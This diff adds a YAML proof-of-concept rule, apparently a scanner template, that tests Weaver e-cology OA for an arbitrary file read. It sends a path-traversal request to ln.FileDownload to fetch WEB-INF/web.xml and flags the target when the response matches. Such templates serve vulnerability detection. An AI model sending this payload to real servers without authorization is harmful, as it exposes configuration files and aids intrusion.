@@ -1,0 +1,17 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-158167
+binding: dda96c4f-321c-4588-8cdc-c89a115863c3
+detail:
+    author: system_user
+    vulnerability:
+        id: 3641a51e-4de1-4972-983b-aa2028b3dc25
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+expression: r0()
